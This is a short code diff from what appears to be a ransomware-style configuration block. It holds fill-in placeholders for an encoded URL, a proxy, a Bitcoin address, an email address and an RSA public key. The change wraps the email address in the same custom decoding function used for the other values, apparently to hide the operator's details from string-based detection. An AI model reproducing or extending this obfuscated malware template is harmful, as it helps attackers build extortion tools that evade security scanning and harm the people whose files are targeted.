@@ -40,7 +40,7 @@ YOUR_URL = dx42(b"YOUR_ENCODED_URL").decode()  # Replace with your encoded URL
 # Example: encoded_url = ex42(b"https://example.com".encode())
 YOUR_PROXY = dx42(b"YOUR_ENCODED_PROXY").decode() # Replace with your encoded proxy
 YOUR_BITCOIN_ADDRESS = "YOUR_BITCOIN_ADDRESS"
-YOUR_EMAIL_ADDRESS = "YOUR_EMAIL_ADDRESS"
+YOUR_EMAIL_ADDRESS = dx42(b"YOUR_ENCODED_EMAIL_ADDRESS").decode()
 id = ""
 
 RSA_PUBLIC_KEY = """-----BEGIN RSA PUBLIC KEY-----
